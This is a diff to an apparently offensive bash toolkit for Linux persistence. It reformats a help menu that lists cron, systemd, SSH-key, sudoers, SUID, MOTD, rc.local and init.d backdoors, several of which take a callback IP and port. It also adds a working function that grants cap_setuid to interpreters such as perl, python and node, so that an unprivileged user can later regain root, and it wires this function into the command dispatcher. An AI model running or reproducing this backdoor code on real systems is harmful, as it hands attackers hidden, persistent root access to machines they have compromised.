@@ -76,105 +76,110 @@ usage_user() {
 }
 
 usage_root() {
-	echo "Root User Options:"
-	echo ""
-	echo "  --cron                      Cron job persistence"
-	echo "      --default                    Use default cron settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom cron settings"
-	echo "          --command <command>         Specify custom persistence command (no validation)"
-	echo "          --crond                     Persist in cron.d directory"
-	echo "          --daily                     Persist in cron.daily directory"
-	echo "          --hourly                    Persist in cron.hourly directory"
-	echo "          --monthly                   Persist in cron.monthly directory"
-	echo "          --weekly                    Persist in cron.weekly directory"
-	echo "          --name <name>               Specify custom cron job name"
-	echo "          --crontab                   Persist in crontab file"
-	echo "  --ssh-key                   SSH key persistence"
-	echo "      --default                    Use default SSH key settings"
-	echo "      --custom                     Use custom SSH key settings"
-	echo "          --user <user>               Specify user for custom SSH key"
-	echo "  --systemd                   Systemd service persistence"
-	echo "      --default                    Use default systemd settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
-	echo "          --path <path>                Specify custom service path (must end with .service)"
-	echo "          --command <command>          Specify custom persistence command (no validation)"
-	echo "          --timer                      Create systemd timer (1 minute interval)"
-	echo "  --at                         At job persistence"
-	echo "      --default                    Use default at settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-	echo "      --custom                     Use custom at settings"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-	echo "  --shell-configuration         Shell profile persistence"
-	echo "      --default                    Use default profile settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom profile settings"
-	echo "          --file <file>                Specify custom profile file"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "  --xdg                        XDG autostart persistence"
-	echo "      --default                    Use default XDG settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom XDG settings"
-	echo "          --file <file>                Specify custom desktop entry file"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "  --authorized-keys            Authorized keys management"
-	echo "      --default                    Use default authorized keys settings"
-	echo "          --key <key>                Specify the public key"
-	echo "      --custom                     Use custom authorized keys settings"
-	echo "          --key <key>                Specify the public key"
-	echo "          --path <path>              Specify custom authorized keys file path"
-	echo "  --create-user                Create a new user"
-	echo "      --default                    Use default user creation settings"
-	echo "          --username <username>      Specify the username"
-	echo "          --password <password>      Specify the password"
-	echo "  --backdoor-user              Set up a backdoor user"
-	echo "      --default                    Use default backdoor user settings"
-	echo "          --username <username>      Specify the username"
-	echo "  --password-change            Change user password"
-	echo "      --default                    Use default password change settings"
-	echo "          --username <username>      Specify the username"
-	echo "          --password <password>      Specify the password"
-	echo "  --passwd-user                Add user to /etc/passwd with specified settings"
-	echo "      --default                    Use default passwd settings"
-	echo "          --username <username>      Specify the username"
-	echo "          --password <password>      Specify the password"
-	echo "      --custom                     Use custom passwd string"
-	echo "          --passwd-string <string>   Specify the passwd string"
-	echo "  --sudoers-backdoor           Set up sudoers backdoor"
-	echo "      --default                    Use default sudoers backdoor settings"
-	echo "          --username <username>      Specify the username"
-	echo "  --suid-backdoor              Set up SUID backdoor"
-	echo "      --default                    Use default SUID backdoor settings"
-	echo "      --custom                     Use custom SUID backdoor settings"
-	echo "          --binary <binary>          Specify the binary"
-	echo "  --motd-backdoor              Set up MOTD backdoor"
-	echo "      --default                    Use default MOTD backdoor settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom MOTD backdoor settings"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "          --path <path>                Specify custom path in /etc/update-motd.d/"
-	echo "  --rc-local-backdoor          Set up rc.local backdoor"
-	echo "      --default                    Use default rc.local backdoor settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom rc.local backdoor settings"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "  --initd-backdoor             Set up init.d backdoor"
-	echo "      --default                    Use default init.d backdoor settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom init.d backdoor settings"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "          --path <path>                Specify custom path in /etc/init.d/"
+    echo "Root User Options:"
+    echo ""
+    echo "  --cron                      Cron job persistence"
+    echo "      --default                    Use default cron settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom cron settings"
+    echo "          --command <command>         Specify custom persistence command (no validation)"
+    echo "          --crond                     Persist in cron.d directory"
+    echo "          --daily                     Persist in cron.daily directory"
+    echo "          --hourly                    Persist in cron.hourly directory"
+    echo "          --monthly                   Persist in cron.monthly directory"
+    echo "          --weekly                    Persist in cron.weekly directory"
+    echo "          --name <name>               Specify custom cron job name"
+    echo "          --crontab                   Persist in crontab file"
+    echo "  --ssh-key                   SSH key persistence"
+    echo "      --default                    Use default SSH key settings"
+    echo "      --custom                     Use custom SSH key settings"
+    echo "          --user <user>               Specify user for custom SSH key"
+    echo "  --systemd                   Systemd service persistence"
+    echo "      --default                    Use default systemd settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
+    echo "          --path <path>                Specify custom service path (must end with .service)"
+    echo "          --command <command>          Specify custom persistence command (no validation)"
+    echo "          --timer                      Create systemd timer (1 minute interval)"
+    echo "  --at                         At job persistence"
+    echo "      --default                    Use default at settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+    echo "      --custom                     Use custom at settings"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+    echo "  --shell-configuration         Shell profile persistence"
+    echo "      --default                    Use default profile settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom profile settings"
+    echo "          --file <file>                Specify custom profile file"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "  --xdg                        XDG autostart persistence"
+    echo "      --default                    Use default XDG settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom XDG settings"
+    echo "          --file <file>                Specify custom desktop entry file"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "  --authorized-keys            Authorized keys management"
+    echo "      --default                    Use default authorized keys settings"
+    echo "          --key <key>                Specify the public key"
+    echo "      --custom                     Use custom authorized keys settings"
+    echo "          --key <key>                Specify the public key"
+    echo "          --path <path>              Specify custom authorized keys file path"
+    echo "  --create-user                Create a new user"
+    echo "      --default                    Use default user creation settings"
+    echo "          --username <username>      Specify the username"
+    echo "          --password <password>      Specify the password"
+    echo "  --backdoor-user              Set up a backdoor user"
+    echo "      --default                    Use default backdoor user settings"
+    echo "          --username <username>      Specify the username"
+    echo "  --password-change            Change user password"
+    echo "      --default                    Use default password change settings"
+    echo "          --username <username>      Specify the username"
+    echo "          --password <password>      Specify the password"
+    echo "  --passwd-user                Add user to /etc/passwd with specified settings"
+    echo "      --default                    Use default passwd settings"
+    echo "          --username <username>      Specify the username"
+    echo "          --password <password>      Specify the password"
+    echo "      --custom                     Use custom passwd string"
+    echo "          --passwd-string <string>   Specify the passwd string"
+    echo "  --sudoers-backdoor           Set up sudoers backdoor"
+    echo "      --default                    Use default sudoers backdoor settings"
+    echo "          --username <username>      Specify the username"
+    echo "  --suid-backdoor              Set up SUID backdoor"
+    echo "      --default                    Use default SUID backdoor settings"
+    echo "      --custom                     Use custom SUID backdoor settings"
+    echo "          --binary <binary>          Specify the binary"
+    echo "  --cap-backdoor               Set up capabilities backdoor"
+    echo "      --default                    Use default capabilities settings"
+    echo "      --custom                     Use custom capabilities settings"
+    echo "          --capability <capability>  Specify the capability"
+    echo "          --binary <binary>          Specify the binary"
+    echo "  --motd-backdoor              Set up MOTD backdoor"
+    echo "      --default                    Use default MOTD backdoor settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom MOTD backdoor settings"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "          --path <path>                Specify custom path in /etc/update-motd.d/"
+    echo "  --rc-local-backdoor          Set up rc.local backdoor"
+    echo "      --default                    Use default rc.local backdoor settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom rc.local backdoor settings"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "  --initd-backdoor             Set up init.d backdoor"
+    echo "      --default                    Use default init.d backdoor settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom init.d backdoor settings"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "          --path <path>                Specify custom path in /etc/init.d/"
     echo "  --apt-persistence            Set up APT persistence"
     echo "      --default                    Use default APT persistence settings"
     echo "          --ip <ip>                  Specify IP address"
@@ -1577,6 +1582,85 @@ setup_apt_persistence() {
     fi
 }
 
+setup_cap_backdoor() {
+    local default=0
+    local custom=0
+    local capability=""
+    local binary=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --capability )
+                shift
+                capability=$1
+                ;;
+            --binary )
+                shift
+                binary=$1
+                ;;
+            * )
+                echo "Invalid option for --cap-backdoor: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 && $custom -eq 1 ]]; then
+        echo "Error: --default and --custom cannot be specified together."
+        exit 1
+    fi
+
+    if [[ $default -eq 0 && $custom -eq 0 ]]; then
+        echo "Error: Either --default or --custom must be specified."
+        exit 1
+    fi
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        exit 1
+    fi
+
+    if [[ $default -eq 1 ]]; then
+        local binaries=("perl" "ruby", "php" "python" "python3", "node")
+        for bin in "${binaries[@]}"; do
+            if command -v $bin &> /dev/null; then
+                local path=$(command -v $bin)
+                setcap cap_setuid+ep $path
+                if [[ $? -eq 0 ]]; then
+                    echo "[+] Capability setuid granted to $path"
+                else
+                    echo "[-] Failed to grant capability setuid to $path"
+                fi
+            else
+                echo "[-] $bin is not present on the system."
+            fi
+        done
+    elif [[ $custom -eq 1 ]]; then
+        if [[ -z $capability || -z $binary ]]; then
+            echo "Error: --capability and --binary must be specified with --custom."
+            exit 1
+        fi
+
+        if command -v $binary &> /dev/null; then
+            local path=$(command -v $binary)
+            setcap $capability $path
+            if [[ $? -eq 0 ]]; then
+                echo "[+] Capability $capability granted to $path"
+            else
+                echo "[-] Failed to grant capability $capability to $path"
+            fi
+        else
+            echo "[-] $binary is not present on the system."
+        fi
+    fi
+}
+
 main() {
 	local QUIET=0
 
@@ -1703,6 +1787,11 @@ main() {
 			--apt-persistence )
                 shift
                 setup_apt_persistence "$@"
+                exit
+                ;;
+            --cap-backdoor )
+                shift
+                setup_cap_backdoor "$@"
                 exit
                 ;;
 			* )
